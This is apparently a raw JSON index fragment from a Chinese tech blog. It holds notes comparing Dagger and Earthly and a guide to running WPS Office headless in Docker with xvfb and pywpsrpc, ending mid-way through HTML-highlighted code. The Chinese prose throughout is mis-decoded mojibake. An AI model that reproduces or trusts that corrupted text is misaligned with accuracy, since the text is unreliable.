ä¸­å°±ä¸è¡Œäº†ï¼Œæ²¡æœ‰åŠæ—¶ä¸ Dockerfile ä¸Šæ¸¸å¯¹é½\nå¦ä¸€æ–¹é¢æ˜¯ä» github ä»“åº“æ¥çœ‹ï¼ŒEarthly ä¸å¦‚ Dagger æ´»è·ƒï¼Œæ¯•ç«Ÿ Dagger æ˜¯ Docker åˆ›å§‹äººç‰µå¤´ï¼Œæœ‰ä¸€å®šçš„æ˜æ˜Ÿæ•ˆåº”ï¼Œèƒ½å¸å¼•æ›´å¤šçš„äººæ¥å‚ä¸å¼€æºç»´æŠ¤ã€‚\nå…¶å®ä»è¯­æ³•æ¥çœ‹ï¼Œæˆ‘è§‰å¾—åˆ†ä¸å‡ºå¤ªå¤§ä¼˜åŠ£ï¼Œä½¿ç”¨ Dockerfile çš„è¯­æ³•ç¼ºç‚¹æ˜¯çµæ´»æ€§ä¸å¦‚ç¼–ç¨‹è¯­è¨€é«˜ï¼Œä½†ä¼˜ç‚¹æ˜¯ä¾¿äºç»´æŠ¤ã€‚\nå¦‚æœæ˜¯ä¹‹å‰ä½¿ç”¨ CUE è¯­è¨€çš„ Daggerï¼Œé‚£æˆ‘è§‰å¾—ä¸å¦‚ä½¿ç”¨ Earthly äº†ï¼Œä¸éœ€è¦å¤šå­¦ä¸€é—¨è¯­è¨€ï¼Œä½†ç°åœ¨ Dagger æ”¹æˆäº†ä½¿ç”¨ç¼–ç¨‹è¯­è¨€ç»´æŠ¤ï¼Œä½¿ç”¨ Dagger SDK æ¥æ„å»ºï¼Œè¿™æ ·å°±æ¯”ä¹‹å‰æ–¹ä¾¿å¤šäº†ã€‚\næˆ‘ç›®å‰å‘ç°äº† Earthly çš„ä¸¤ä¸ª bug\nUnexpected environment variable substitution Â· Issue #4305 Â· earthly/earthly ENV doesn't support setting multiple values Â· Issue #3959 Â· earthly/earthly å®˜æ–¹ä¹Ÿä¸æ˜¯å¾ˆç§¯æã€‚\nå°±ç›®å‰é¡¹ç›®å‰æ™¯æ¥çœ‹ï¼Œå¯èƒ½ Dagger æ›´å¥½ä¸€äº›\n","permalink":"https://www.hacktech.cn/post/dagger-use-notes-vbgyk.html","summary":"\u003ch1 id=\"dagger-ä½¿ç”¨æœ­è®°\"\u003eDagger ä½¿ç”¨æœ­è®°\u003c/h1\u003e\n\u003ch2 id=\"å·¥å…·ä»‹ç»\"\u003eå·¥å…·ä»‹ç»\u003c/h2\u003e\n\u003cp\u003eç”¨äºæ„å»º DevOps å·¥ä½œæµçš„å¼€æºå¹³å°ï¼Œæ—¨åœ¨ç®€åŒ–å’Œæ ‡å‡†åŒ–å¤æ‚çš„ CI/CD ç®¡é“ã€‚\u003c/p\u003e\n\u003cp\u003eDagger æä¾›äº† Go/Python/TypeScript ç­‰è¯­è¨€çš„ sdkï¼Œä½¿ä½ èƒ½ä½¿ç”¨è¿™äº›è¯­è¨€æ¥æ“ä½œ BuildKit æ¥ç”Ÿæˆæˆ–æ¨é€ä½ æƒ³è¦çš„æ–‡ä»¶æˆ–é•œåƒ\u003c/p\u003e","title":"Dagger ä½¿ç”¨æœ­è®°"},{"content":"ä¸€èˆ¬å¦‚æœä½¿ç”¨å¸¦æ¡Œé¢ç¯å¢ƒçš„ dockerï¼Œæ¯”å¦‚ dorowu/ubuntu-desktop-lxde-vncï¼Œç„¶åå®‰è£… wps åï¼Œä½¿ç”¨ https://github.com/timxx/pywpsrpc æ˜¯æ²¡å•¥é—®é¢˜çš„ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ wps ç¬¬ä¸€æ¬¡æ‰“å¼€åï¼Œéœ€è¦åŒæ„ EULAï¼Œç„¶åæŒ‰ç…§ https://github.com/timxx/pywpsrpc/issues/44#issuecomment-1032304847 ä¸­æåˆ°çš„æ”¹ä¸º multi-module modeï¼Œç„¶åå°±å¯ä»¥æ„‰å¿«ä½¿ç”¨äº†ï¼Œä½†æ˜¯å¯¹äºæ— å›¾å½¢ç¯å¢ƒçš„ dockerï¼Œä¼¼ä¹æ˜¯è¿ wps éƒ½æ— æ³•å¯åŠ¨\nè§£å†³WPSæ— æ³•å¯åŠ¨çš„é—®é¢˜ wpså®‰è£…ä¹‹å‰éœ€è¦å®‰è£…ä¸€äº›ä¾èµ–ç¯å¢ƒï¼Œè¿™ä¸ªåæ–‡ç»™å‡ºå®Œæ•´çš„å®‰è£…æµç¨‹ï¼Œæ­¤å¤„ä¸»è¦è§£å†³ wps å®‰è£…å®Œæˆåï¼Œå¯åŠ¨æ— è¾“å‡ºï¼Œç›´æ¥é—ªé€€çš„é—®é¢˜\næ­¤å¤„å®‰è£… https://github.com/timxx/pywpsrpc/wiki/Run-on-Server é…ç½®äº†ç¯å¢ƒï¼Œä½†æ˜¯wpsä¾æ—§é—ªé€€\né¦–å…ˆæ‰§è¡Œ whereis wps ï¼Œæˆ‘ä»¬æ‰¾åˆ° wps çš„æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼Œä¸€èˆ¬ä½äº /usr/bin/wps\nç„¶åæˆ‘ä»¬ç¼–è¾‘è¯¥æ–‡ä»¶\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function run() { oldPwd=\u0026#34;${PWD}\u0026#34; if [ -e \u0026#34;${gInstallPath}/office6/${gApp}\u0026#34; ] ; then if [ 1 -eq ${gDaemon} ]; then nohup ${gInstallPath}/office6/${gApp} ${gOpt} \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; elif [ 1 -eq ${gIsUrl} ]; then { ${gInstallPath}/office6/${gApp} ${gOptExt} ${gOpt} \u0026#34;${gFilePaths[@]}\u0026#34;; } \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 elif [ 1 -eq ${gIsFushion} ] \u0026amp;\u0026amp; [ \u0026#34;$1\u0026#34; != \u0026#34;/prometheus\u0026#34; ]; then { unset GIO_LAUNCHED_DESKTOP_FILE \u0026amp;\u0026amp; ${gInstallPath}/office6/${gApp} /prometheus ${gOptExt} ${gOpt} \u0026#34;$@\u0026#34;; } \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 else { ${gInstallPath}/office6/${gApp} ${gOptExt} ${gOpt} \u0026#34;$@\u0026#34;; } fi else echo \u0026#34;${gApp} does not exist!\u0026#34; fi } å°†æœ€åä¸€ä¸ª else çš„è¾“å‡ºé‡å®šå‘å»é™¤ï¼Œæ­¤æ—¶æˆ‘ä»¬å†è¿è¡Œ wps å°±æœ‰æŠ¥é”™è¾“å‡ºäº†\n1 dlopen /opt/kingsoft/wps-office/office6/libwpsmain.so failed , error: libxslt.so.1: cannot open shared object file: No such file or directory ç„¶åæˆ‘ä»¬è¿è¡Œä¸‹é¢çš„å‘½ä»¤æ¥è§£å†³ä»–\n1 apt-get install -y libxslt1.1 ç„¶åå†è¿è¡Œwpså³å¯ï¼Œå¦‚æœè¿˜æ˜¯æœ‰ç¼ºå¤±çš„é—®é¢˜ï¼Œç»§ç»­æ‰¾è¡¥\næˆ–è€…å¯ä»¥ç›´æ¥è¿è¡Œ xvfb-run /opt/kingsoft/wps-office/office6/wps æ¥çœ‹æŠ¥é”™\næ•´ä½“å®‰è£…æµç¨‹(for ubuntu) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 apt-get install -y wget # ä¸‹è½½ deb å®‰è£…åŒ… wget https://wps-linux-personal.wpscdn.cn/wps/download/ep/Linux2019/11698/wps-office_11.1.0.11698_amd64.deb # é˜²æ­¢ debconf (no usable dialog-like program æŠ¥é”™ ref:https://www.kaijia.me/2015/09/unable-to-initialize-frontend-dialog-issue-solved/ apt-get install -y dialog # å®‰è£… wps æ‰€éœ€ä¾èµ–ï¼ˆå®‰è£…wpsæ—¶éœ€è¦ï¼‰ apt-get install -y bsdmainutils xdg-utils # å®‰è£… wps apt-get install -y ./wps-office_11.1.0.11698_amd64.deb # å®‰è£…è¿è¡Œ wps æ—¶çš„ä¾èµ– apt-get install -y libxslt1.1 qtbase5-dev # å®‰è£…è™šæ‹Ÿæ˜¾ç¤ºå™¨ apt-get install -y xvfb # ä½¿ç”¨ xvfb æ¥è¿è¡Œ wps xvfb-run wps ä½†æ˜¯æ­¤æ—¶å¦‚æœä½ ä½¿ç”¨ pywpsrpcï¼Œè¿˜æ˜¯å¯åŠ¨ä¸èµ·æ¥çš„\néœ€è¦åŒæ„ wps çš„ EULA å¹¶ä¸”å°† wps æ”¹ä¸ºå¤šç»„ä»¶æ¨¡å¼\n1 2 3 4 5 # å°† wps æ”¹ä¸ºå¤šç»„ä»¶æ¨¡å¼ echo \u0026#39;wpsoffice\\Application%20Settings\\AppComponentMode=prome_independ\u0026#39; \u0026gt;\u0026gt; ~/.config/Kingsoft/Office.conf echo \u0026#39;wpsoffice\\Application%20Settings\\AppComponentModeInstall=prome_independ\u0026#39; \u0026gt;\u0026gt; ~/.config/Kingsoft/Office.conf # åŒæ„ wps çš„EULA echo \u0026#39;common\\AcceptedEULA=true\u0026#39; \u0026gt;\u0026gt; ~/.config/Kingsoft/Office.conf æ³¨æ„æ­¤æ—¶è°ƒç”¨ pywpsrpc å…¶å®è¿˜ä¼šå‡ºç°ä¸€ä¸ªé”™è¯¯\n1 2 3 4 /tmp/64742_asso/assocheck.sh: line 18: gvfs-info: command not found /tmp/64742_asso/assocheck.sh: line 19: gvfs-mime: command not found /tmp/13013_desktop/desktopcheck.sh: line 23: gvfs-info: command not found /tmp/13013_desktop/desktopcheck.sh: line 24: gvfs-mime: command not found æµ‹è¯•åæ„Ÿè§‰è¯¥é”™è¯¯ä¸å½±å“ä½¿ç”¨ï¼Œå¦‚æœåœ¨æ„çš„è¯å¯ä»¥é€šè¿‡ apt install gvfs-bin æ¥è§£å†³\nå°è£…çš„ Docker ä¸ºäº†æ›´ç²¾ç®€ï¼Œqtbase5-dev å¯æ›¿æ¢ä¸º libqt5gui5\nä½†æ³¨æ„ï¼Œå¯¼å…¥ä½¿ç”¨ pywpsrpc æ—¶å¯èƒ½ä¼šæŠ¥é”™ ImportError: libQt5Xml.so.5: cannot open shared object file: No such file or directory ï¼Œè¿˜éœ€è¦å®‰è£… libQt5Xml\n1 apt-get install -y libqt5xml5 å¦‚æœä¸å·®ç©ºé—´ï¼Œä½¿ç”¨ pywpsrpc å‰æ›´å»ºè®®å®‰è£… qtbase5-dev\næ ¹æ®ä¸Šé¢çš„æµ‹è¯•ï¼Œæˆ‘åšäº†ä¸€ä¸ªé•œåƒ\nè¯¥é•œåƒåªå®‰è£…äº† wpsï¼Œå¹¶ä¸”åšå¥½äº†å¯ä½¿ç”¨çš„é…ç½®ï¼Œå¯å‚ç…§readmeè¿›è¡Œä½¿ç”¨\nhttps://github.com/akkuman/headless-wps\né’ˆå¯¹arm64çš„æˆ‘ä¹Ÿåšäº†æµ‹è¯•ï¼Œç»“æœå‘ç°å®é™…ä¸Š wps æ— æ³•åœ¨ é²²é¹920+éº’éºŸV10 ä¸Šæ­£å¸¸è¿è¡Œï¼Œå½“ç„¶ï¼Œå¯èƒ½æ˜¯å› ä¸ºè¿™ä¸ªç³»ç»Ÿå†…æ ¸çš„å†…å­˜å¯¹é½æ¯”è¾ƒç‰¹æ®Šï¼Œè¿chromeä¹Ÿæ²¡æ³•åœ¨è¿™ä¸ªç³»ç»Ÿä¸Šè·‘\nReferences https://github.com/timxx/pywpsrpc/issues/19#issuecomment-1075996867 https://github.com/timxx/pywpsrpc/issues/44#issuecomment-1032304847 https://github.com/timxx/pywpsrpc/wiki/Run-on-Server ","permalink":"https://www.hacktech.cn/post/2023-08-02-docker-%E4%B8%AD%E4%BD%BF%E7%94%A8-pywpsrpc.html","summary":"\u003cp\u003eä¸€èˆ¬å¦‚æœä½¿ç”¨å¸¦æ¡Œé¢ç¯å¢ƒçš„ dockerï¼Œæ¯”å¦‚ dorowu/ubuntu-desktop-lxde-vncï¼Œç„¶åå®‰è£… wps åï¼Œä½¿ç”¨ \u003ca href=\"https://github.com/timxx/pywpsrpc\"\u003ehttps://github.com/timxx/pywpsrpc\u003c/a\u003e æ˜¯æ²¡å•¥é—®é¢˜çš„ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ wps ç¬¬ä¸€æ¬¡æ‰“å¼€åï¼Œéœ€è¦åŒæ„ EULAï¼Œç„¶åæŒ‰ç…§ \u003ca href=\"https://github.com/timxx/pywpsrpc/issues/44#issuecomment-1032304847\"\u003ehttps://github.com/timxx/pywpsrpc/issues/44#issuecomment-1032304847\u003c/a\u003e ä¸­æåˆ°çš„æ”¹ä¸º multi-module modeï¼Œç„¶åå°±å¯ä»¥æ„‰å¿«ä½¿ç”¨äº†ï¼Œä½†æ˜¯å¯¹äºæ— å›¾å½¢ç¯å¢ƒçš„ dockerï¼Œä¼¼ä¹æ˜¯è¿ wps éƒ½æ— æ³•å¯åŠ¨\u003c/p\u003e\n\u003ch2 id=\"è§£å†³wpsæ— æ³•å¯åŠ¨çš„é—®é¢˜\"\u003eè§£å†³WPSæ— æ³•å¯åŠ¨çš„é—®é¢˜\u003c/h2\u003e\n\u003cp\u003ewpså®‰è£…ä¹‹å‰éœ€è¦å®‰è£…ä¸€äº›ä¾èµ–ç¯å¢ƒï¼Œè¿™ä¸ªåæ–‡ç»™å‡ºå®Œæ•´çš„å®‰è£…æµç¨‹ï¼Œæ­¤å¤„ä¸»è¦è§£å†³ wps å®‰è£…å®Œæˆåï¼Œå¯åŠ¨æ— è¾“å‡ºï¼Œç›´æ¥é—ªé€€çš„é—®é¢˜\u003c/p\u003e\n\u003cp\u003eæ­¤å¤„å®‰è£… \u003ca href=\"https://github.com/timxx/pywpsrpc/wiki/Run-on-Server\"\u003ehttps://github.com/timxx/pywpsrpc/wiki/Run-on-Server\u003c/a\u003e é…ç½®äº†ç¯å¢ƒï¼Œä½†æ˜¯wpsä¾æ—§é—ªé€€\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæ‰§è¡Œ \u003ccode\u003ewhereis wps\u003c/code\u003e ï¼Œæˆ‘ä»¬æ‰¾åˆ° wps çš„æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼Œä¸€èˆ¬ä½äº \u003ccode\u003e/usr/bin/wps\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åæˆ‘ä»¬ç¼–è¾‘è¯¥æ–‡ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 7\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 8\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 9\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e10\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e11\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e12\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e13\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e14\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e15\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e16\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e17\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-docker\" data-lang=\"docker\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e run\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e        oldPwd\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003ePWD\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egInstallPath\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/office6/\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egApp\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e ; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e                \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e -eq \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egDaemon\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e                        nohup \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egInstallPath\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e/office6/\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egApp\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egOpt\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e \u0026gt; /dev/null 2\u0026gt;\u0026amp;\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u0026amp;\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e                \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e -eq \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egIsUrl\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e                        \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egInstallPath\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e/office6/\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egApp\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egOptExt\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egOpt\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egFilePaths[@]\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e; \u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e \u0026gt; /dev/null 2\u0026gt;\u0026amp;\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e                \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e -eq \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egIsFushion\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e !\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/prometheus\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e                        \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e unset GIO_LAUNCHED_DESKTOP_FILE \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egInstallPath\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e/office6/\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egApp\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e /prometheus \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egOptExt\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egOpt\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$@\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e; \u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e \u0026gt; /dev/null 2\u0026gt;\u0026amp;\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e                \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e                        \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egInstallPath\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e/office6/\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egApp\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egOptExt\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egOpt\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$@\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e; \u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e                \u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e                echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003egApp\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e does not exist!\u0026#34;\u003c/span\u003e\u003cspan 